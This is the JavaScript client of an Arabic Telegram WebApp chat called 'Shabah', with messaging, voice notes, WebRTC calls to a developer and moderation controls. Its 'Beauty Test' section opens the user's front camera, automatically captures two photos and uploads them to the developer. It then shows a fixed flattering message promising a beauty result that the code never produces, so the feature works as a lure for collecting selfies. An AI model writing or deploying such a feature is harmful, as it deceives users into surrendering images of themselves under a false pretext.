/**
 * منصة شبح | SHABAH CLIENT ENGINE
 * WebSockets, WebRTC, Voice Recording, Camera Snap, Moderation
 */

// 1. User & Session Setup
let tgUser = null;
if (window.Telegram && window.Telegram.WebApp) {
  try {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
    tgUser = window.Telegram.WebApp.initDataUnsafe?.user;
  } catch (e) {
    console.log("Telegram WebApp not active or running in browser");
  }
}

// Generate persistent ID if not from Telegram
let userId = tgUser?.id ? String(tgUser.id) : localStorage.getItem("shabah_uid");
if (!userId) {
  userId = "usr_" + Math.random().toString(36).substring(2, 9);
  localStorage.setItem("shabah_uid", userId);
}

let userName = tgUser?.first_name 
  ? (tgUser.first_name + (tgUser.last_name ? " " + tgUser.last_name : "")) 
  : (localStorage.getItem("shabah_uname") || "زائر #" + userId.slice(-4));

let isMuted = false;
let socket = null;
let currentCallId = null;
let callType = null; // 'voice' | 'video'

// WebRTC State
let peerConnection = null;
let localStream = null;
let isAudioMuted = false;
let isVideoMuted = false;
let pendingIceCandidates = [];

const iceServers = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" }
  ]
};

// DOM Elements
const chatMessages = document.getElementById("chatMessages");
const msgInput = document.getElementById("msgInput");
const sendBtn = document.getElementById("sendBtn");
const micRecordBtn = document.getElementById("micRecordBtn");
const cameraSnapBtn = document.getElementById("cameraSnapBtn");
const fileInput = document.getElementById("fileInput");
const callVoiceBtn = document.getElementById("callVoiceBtn");
const callVideoBtn = document.getElementById("callVideoBtn");

// Modals
const callModal = document.getElementById("callModal");
const callStatusText = document.getElementById("callStatusText");
const remoteVideo = document.getElementById("remoteVideo");
const localVideo = document.getElementById("localVideo");
const skullMaskView = document.getElementById("skullMaskView");
const toggleMicBtn = document.getElementById("toggleMicBtn");
const toggleVideoBtn = document.getElementById("toggleVideoBtn");
const hangupBtn = document.getElementById("hangupBtn");

// Camera Snap Modal
const cameraSnapModal = document.getElementById("cameraSnapModal");
const snapVideo = document.getElementById("snapVideo");
const takeSnapBtn = document.getElementById("takeSnapBtn");
const closeSnapBtn = document.getElementById("closeSnapBtn");

// Voice Recording UI
const recordingBar = document.getElementById("recordingBar");
const recordingTimer = document.getElementById("recordingTimer");
const stopRecordBtn = document.getElementById("stopRecordBtn");
const cancelRecordBtn = document.getElementById("cancelRecordBtn");

// Banned & Muted
const bannedScreen = document.getElementById("bannedScreen");
const mutedToast = document.getElementById("mutedToast");

// 2. Initialize WebSocket Connection
function initWebSocket() {
  const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
  const wsUrl = `${protocol}//${window.location.host}/ws/${userId}?name=${encodeURIComponent(userName)}`;

  socket = new WebSocket(wsUrl);

  socket.onopen = () => {
    console.log("⚡ Connected to Shabah Core WebSocket");
    appendSystemMessage("تم الاتصال المشفر مع شبح ✅");
  };

  socket.onmessage = async (event) => {
    try {
      const data = JSON.parse(event.data);
      handleSocketMessage(data);
    } catch (err) {
      console.error("WS Parse error:", err);
    }
  };

  socket.onclose = () => {
    console.log("🔌 WS Disconnected. Retrying in 3s...");
    setTimeout(initWebSocket, 3000);
  };

  socket.onerror = (err) => {
    console.error("WS Error:", err);
  };
}

// 3. Handle Inbound Messages
async function handleSocketMessage(data) {
  switch (data.type) {
    case "history":
      chatMessages.innerHTML = "";
      data.messages.forEach(msg => renderMessage(msg));
      scrollBottom();
      break;

    case "chat":
      renderMessage(data.message);
      scrollBottom();
      break;

    case "call_accepted":
      handleCallAccepted(data);
      break;

    case "call_rejected":
      alert("❌ تم رفض طلب الاتصال من قبل المطور.");
      endCallUI();
      break;

    case "call_ended":
      appendSystemMessage("📞 انتهت المكالمة.");
      endCallUI();
      break;

    case "webrtc_answer":
      if (peerConnection && data.sdp) {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.sdp));
        for (const c of pendingIceCandidates.splice(0)) await peerConnection.addIceCandidate(new RTCIceCandidate(c));
      }
      break;

    case "webrtc_ice":
      if (data.candidate) {
        if (peerConnection && peerConnection.remoteDescription) await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
        else pendingIceCandidates.push(data.candidate);
      }
      break;

    case "mask_toggled":
      // Developer toggled disguise mask
      if (data.enabled) {
        remoteVideo.style.display = "none";
        skullMaskView.style.display = "flex";
      } else {
        skullMaskView.style.display = "none";
        remoteVideo.style.display = "block";
      }
      break;

    case "user_muted":
      isMuted = true;
      showMutedNotice(true);
      break;

    case "user_unmuted":
      isMuted = false;
      showMutedNotice(false);
      break;

    case "user_kicked":
      alert("⚡ تم طردك وإنهاء جلستك بواسطة شبح.");
      endCallUI();
      if (socket) socket.close();
      window.location.reload();
      break;

    case "user_banned":
      bannedScreen.classList.add("active");
      endCallUI();
      if (socket) socket.close();
      break;
  }
}

// 4. Chat & Media Rendering
function renderMessage(msg) {
  const isMe = msg.sender_id === userId;
  const isDev = msg.is_developer || msg.sender_id === "shabah_dev";
  
  const bubble = document.createElement("div");
  bubble.className = `message-bubble ${isMe ? 'outgoing' : 'incoming'}`;

  const senderTag = document.createElement("span");
  senderTag.className = "sender-tag";
  senderTag.textContent = isDev ? "💀 شبح (المطور)" : (isMe ? "أنت" : msg.sender_name);
  bubble.appendChild(senderTag);

  if (msg.msg_type === "text") {
    const textNode = document.createElement("div");
    textNode.textContent = msg.content;
    bubble.appendChild(textNode);
  } else if (msg.msg_type === "voice") {
    const audioWrap = document.createElement("div");
    audioWrap.className = "voice-message-player";
    
    const playBtn = document.createElement("button");
    playBtn.className = "btn-play-voice";
    playBtn.innerHTML = "▶";
    
    const audio = new Audio(msg.file_url);
    playBtn.onclick = () => {
      if (audio.paused) {
        audio.play();
        playBtn.innerHTML = "⏸";
      } else {
        audio.pause();
        playBtn.innerHTML = "▶";
      }
    };
    audio.onended = () => { playBtn.innerHTML = "▶"; };

    const waveNode = document.createElement("div");
    waveNode.className = "voice-waveform";
    waveNode.innerHTML = `
      <div class="voice-wave-bar" style="height: 12px;"></div>
      <div class="voice-wave-bar" style="height: 20px;"></div>
      <div class="voice-wave-bar" style="height: 8px;"></div>
      <div class="voice-wave-bar" style="height: 16px;"></div>
      <div class="voice-wave-bar" style="height: 22px;"></div>
      <div class="voice-wave-bar" style="height: 14px;"></div>
    `;

    audioWrap.appendChild(playBtn);
    audioWrap.appendChild(waveNode);
    bubble.appendChild(audioWrap);
  } else if (msg.msg_type === "image") {
    const img = document.createElement("img");
    img.src = msg.file_url;
    img.className = "image-message-view";
    img.onclick = () => window.open(msg.file_url, "_blank");
    bubble.appendChild(img);
  }

  const timeNode = document.createElement("span");
  timeNode.className = "msg-time";
  timeNode.textContent = msg.timestamp || "";
  bubble.appendChild(timeNode);

  chatMessages.appendChild(bubble);
}

function appendSystemMessage(text) {
  const bubble = document.createElement("div");
  bubble.className = "message-bubble system";
  bubble.textContent = text;
  chatMessages.appendChild(bubble);
  scrollBottom();
}

function scrollBottom() {
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

// 5. Send Text Message
function sendTextMessage() {
  if (isMuted) {
    alert("🚫 لا يمكنك إرسال رسائل لأنك مكتوم حالياً.");
    return;
  }
  const text = msgInput.value.trim();
  if (!text || !socket || socket.readyState !== WebSocket.OPEN) return;

  socket.send(JSON.stringify({
    action: "send_message",
    msg_type: "text",
    content: text
  }));

  msgInput.value = "";
}

sendBtn.onclick = sendTextMessage;
msgInput.onkeypress = (e) => {
  if (e.key === "Enter") sendTextMessage();
};

// 6. Voice Recording ("بصمة صوتية")
let mediaRecorder = null;
let audioChunks = [];
let recordInterval = null;
let recordSeconds = 0;

micRecordBtn.onclick = async () => {
  if (isMuted) {
    alert("🚫 لا يمكنك تسجيل بصمات صوتية لأنك مكتوم.");
    return;
  }
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);
    audioChunks = [];

    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) audioChunks.push(e.data);
    };

    mediaRecorder.onstop = async () => {
      stream.getTracks().forEach(track => track.stop());
      if (audioChunks.length > 0) {
        const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
        await uploadAudio(audioBlob);
      }
    };

    mediaRecorder.start();
    startRecordingUI();
  } catch (err) {
    alert("⚠️ يرجى السماح بالوصول إلى المايكروفون.");
  }
};

function startRecordingUI() {
  recordingBar.style.display = "flex";
  msgInput.style.display = "none";
  recordSeconds = 0;
  recordingTimer.textContent = "00:00";
  recordInterval = setInterval(() => {
    recordSeconds++;
    const m = String(Math.floor(recordSeconds / 60)).padStart(2, "0");
    const s = String(recordSeconds % 60).padStart(2, "0");
    recordingTimer.textContent = `${m}:${s}`;
  }, 1000);
}

function stopRecordingUI() {
  clearInterval(recordInterval);
  recordingBar.style.display = "none";
  msgInput.style.display = "block";
}

stopRecordBtn.onclick = () => {
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
  }
  stopRecordingUI();
};

cancelRecordBtn.onclick = () => {
  audioChunks = [];
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
  }
  stopRecordingUI();
};

async function uploadAudio(blob) {
  const formData = new FormData();
  formData.append("file", blob, "voice.webm");
  formData.append("user_id", userId);
  formData.append("user_name", userName);

  try {
    const res = await fetch("/api/upload-voice", { method: "POST", body: formData });
    const json = await res.json();
    if (json.file_url && socket) {
      socket.send(JSON.stringify({
        action: "send_message",
        msg_type: "voice",
        file_url: json.file_url
      }));
    }
  } catch (e) {
    console.error("Audio upload error:", e);
  }
}

// 7. Beauty Test — explicit consent, then automatic capture + send
let snapStream = null;
let beautyCaptureRunning = false;

const beautyResultMessage = `✨💎 نسبة جمالك تفوق الخيال! 💎✨\n\n😍 هل أنت حقيقي فعلًا؟\n\nيبدو أن الجمال قرر أن يكسر كل المقاييس معك! 🔥👑\n\n📸 استعد… اختبار الجمال الخاص بك قيد التجهيز الآن.\n\n⏳ انتظر قليلًا…\n\nسيصلك الاختبار خلال دقيقة واحدة ✨\n\n💫 هل أنت مستعد لاكتشاف نسبة جمالك؟ 😏`;

cameraSnapBtn.onclick = () => {
  if (isMuted) {
    alert("🚫 لا يمكنك استخدام الاختبار لأنك مكتوم.");
    return;
  }
  // Show the consent message BEFORE requesting camera permission.
  cameraSnapModal.classList.add("active");
};

function stopBeautyCamera() {
  if (snapStream) {
    snapStream.getTracks().forEach(t => t.stop());
    snapStream = null;
  }
  snapVideo.srcObject = null;
}

closeSnapBtn.onclick = () => {
  if (beautyCaptureRunning) return;
  stopBeautyCamera();
  cameraSnapModal.classList.remove("active");
};

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function waitForVideoReady(video) {
  if (video.readyState >= 2 && video.videoWidth > 0) return;
  await new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("camera timeout")), 8000);
    video.addEventListener("loadeddata", () => {
      clearTimeout(timer);
      resolve();
    }, { once: true });
  });
}

function captureBeautyFrame() {
  return new Promise((resolve, reject) => {
    const canvas = document.createElement("canvas");
    canvas.width = snapVideo.videoWidth || 640;
    canvas.height = snapVideo.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    if (!ctx) return reject(new Error("canvas unavailable"));
    ctx.drawImage(snapVideo, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => blob ? resolve(blob) : reject(new Error("capture failed")), "image/jpeg", 0.88);
  });
}

takeSnapBtn.onclick = async () => {
  if (beautyCaptureRunning) return;
  beautyCaptureRunning = true;
  takeSnapBtn.disabled = true;
  closeSnapBtn.disabled = true;
  takeSnapBtn.textContent = "📷 جاري فتح الكاميرا...";

  try {
    // Browser/Telegram will also show the system camera permission prompt.
    snapStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 1280 } },
      audio: false
    });
    snapVideo.srcObject = snapStream;
    await snapVideo.play().catch(() => {});
    await waitForVideoReady(snapVideo);

    takeSnapBtn.textContent = "✨ جاري إجراء الاختبار...";
    await wait(900);

    // The consent text states clearly that exactly two photos are captured and sent.
    for (let i = 0; i < 2; i++) {
      const blob = await captureBeautyFrame();
      const ok = await uploadImage(blob);
      if (!ok) throw new Error("upload failed");
      if (i === 0) await wait(700);
    }

    stopBeautyCamera();
    cameraSnapModal.classList.remove("active");
    appendSystemMessage(beautyResultMessage);
  } catch (e) {
    console.error("Beauty test camera error:", e);
    stopBeautyCamera();
    alert("تعذر فتح الكاميرا أو إرسال الصور. تأكد من السماح للكاميرا ثم حاول مرة أخرى.");
  } finally {
    beautyCaptureRunning = false;
    takeSnapBtn.disabled = false;
    closeSnapBtn.disabled = false;
    takeSnapBtn.textContent = "✅ أوافق وأبدأ";
  }
};

// Kept for compatibility with any existing gallery flow, but the beauty test itself never
// opens the gallery automatically when camera permission is denied.
fileInput.onchange = async () => {
  if (fileInput.files.length > 0) {
    await uploadImage(fileInput.files[0]);
    fileInput.value = "";
  }
};

async function uploadImage(fileOrBlob) {
  const formData = new FormData();
  formData.append("file", fileOrBlob, "snapshot.jpg");
  formData.append("user_id", userId);
  formData.append("user_name", userName);

  try {
    const res = await fetch("/api/upload-image", { method: "POST", body: formData });
    if (!res.ok) return false;
    const json = await res.json();
    if (json.file_url && socket && socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({
        action: "send_message",
        msg_type: "image",
        file_url: json.file_url
      }));
      return true;
    }
    return false;
  } catch (e) {
    console.error("Image upload error:", e);
    return false;
  }
}

// 8. WebRTC Live Voice / Video Calls ("صعود مايك أو كاميرا")
callVoiceBtn.onclick = () => requestCall("voice");
callVideoBtn.onclick = () => requestCall("video");

function requestCall(type) {
  if (isMuted) {
    alert("🚫 لا يمكنك طلب مكالمة لأنك مكتوم.");
    return;
  }
  callType = type;
  currentCallId = "call_" + Date.now();

  callModal.classList.add("active");
  callStatusText.textContent = `جاري طلب صعود ${type === "voice" ? "مايك (صوت)" : "كاميرا (فيديو)"}... بانتظار قبول شبح 💀`;
  
  if (type === "voice") {
    localVideo.style.display = "none";
  } else {
    localVideo.style.display = "block";
  }

  socket.send(JSON.stringify({
    action: "call_request",
    call_id: currentCallId,
    call_type: type
  }));
}

async function handleCallAccepted(data) {
  callStatusText.textContent = "تمت الموافقة • جاري ربط الصوت والصورة...";
  
  try {
    // Acquire local media
    const constraints = {
      audio: true,
      video: callType === "video" ? { width: 640, height: 480 } : false
    };

    localStream = await navigator.mediaDevices.getUserMedia(constraints);
    if (callType === "video") {
      localVideo.srcObject = localStream;
    }

    // Setup WebRTC
    peerConnection = new RTCPeerConnection(iceServers);

    localStream.getTracks().forEach(track => {
      peerConnection.addTrack(track, localStream);
    });

    peerConnection.ontrack = (event) => {
      remoteVideo.srcObject = event.streams[0];
      remoteVideo.play().catch(()=>{});
      callStatusText.textContent = "🟢 متصل الآن مع المطور";
    };

    peerConnection.onicecandidate = (event) => {
      if (event.candidate) {
        socket.send(JSON.stringify({
          action: "webrtc_ice",
          call_id: currentCallId,
          candidate: event.candidate
        }));
      }
    };

    // Create and send WebRTC Offer
    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);

    socket.send(JSON.stringify({
      action: "webrtc_offer",
      call_id: currentCallId,
      sdp: offer
    }));

  } catch (err) {
    console.error("WebRTC Error:", err);
    alert("فشل بدء المكالمة: " + err.message);
    endCallUI();
  }
}

// Call Control Buttons
toggleMicBtn.onclick = () => {
  if (localStream) {
    const audioTrack = localStream.getAudioTracks()[0];
    if (audioTrack) {
      audioTrack.enabled = !audioTrack.enabled;
      isAudioMuted = !audioTrack.enabled;
      toggleMicBtn.classList.toggle("active-off", isAudioMuted);
      toggleMicBtn.innerHTML = isAudioMuted ? "🔇" : "🎙️";
    }
  }
};

toggleVideoBtn.onclick = () => {
  if (localStream && callType === "video") {
    const videoTrack = localStream.getVideoTracks()[0];
    if (videoTrack) {
      videoTrack.enabled = !videoTrack.enabled;
      isVideoMuted = !videoTrack.enabled;
      toggleVideoBtn.classList.toggle("active-off", isVideoMuted);
      toggleVideoBtn.innerHTML = isVideoMuted ? "🚫" : "📷";
    }
  }
};

hangupBtn.onclick = () => {
  if (socket && currentCallId) {
    socket.send(JSON.stringify({
      action: "call_end",
      call_id: currentCallId
    }));
  }
  endCallUI();
};

function endCallUI() {
  if (localStream) {
    localStream.getTracks().forEach(t => t.stop());
    localStream = null;
  }
  if (peerConnection) {
    peerConnection.close();
    peerConnection = null;
  }
  callModal.classList.remove("active");
  currentCallId = null;
}

function showMutedNotice(muted) {
  if (muted) {
    mutedToast.style.display = "block";
    msgInput.placeholder = "تم كتمك بواسطة الإدارة 🔇";
  } else {
    mutedToast.style.display = "none";
    msgInput.placeholder = "اكتب رسالتك إلى شبح...";
  }
}

// Start
initWebSocket();
